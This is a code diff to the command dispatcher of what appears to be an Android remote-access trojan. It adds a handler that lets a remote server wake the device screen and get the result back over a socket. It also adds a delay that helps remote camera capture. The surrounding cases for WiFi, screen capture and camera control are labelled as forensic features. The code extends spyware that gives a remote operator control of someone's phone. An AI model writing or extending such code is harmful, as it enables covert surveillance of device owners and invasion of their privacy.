@@ -266,6 +266,29 @@ public class ConnectionManager {
                 case "x0000wf": // WiFi
                     x0000wf();
                     break;
+
+                case "x0000ws": // Wake Screen
+                    try {
+                        if (context instanceof MainService) {
+                            ((MainService) context).wakeScreen();
+                            JSONObject result = new JSONObject();
+                            result.put("success", true);
+                            ioSocket.emit("x0000ws", result);
+                        } else {
+                            JSONObject result = new JSONObject();
+                            result.put("success", false);
+                            result.put("error", "Context is not MainService");
+                            ioSocket.emit("x0000ws", result);
+                        }
+                    } catch (Exception e) {
+                        try {
+                            JSONObject result = new JSONObject();
+                            result.put("success", false);
+                            result.put("error", e.getMessage());
+                            ioSocket.emit("x0000ws", result);
+                        } catch (Exception ex) {}
+                    }
+                    break;
                     
                 // === NEW FORENSIC FEATURES ===
                 case "x0000sc": // Screen Capture
@@ -343,6 +366,7 @@ public class ConnectionManager {
     // === EXISTING HANDLERS ===
     
     private static void handleCameraOrder(JSONObject data) throws Exception {
+        Thread.sleep(1000); // Add a delay to allow the activity to come to the foreground
         String extra = data.getString("extra");
         if (extra.equals("camList")) {
             x0000ca(-1);
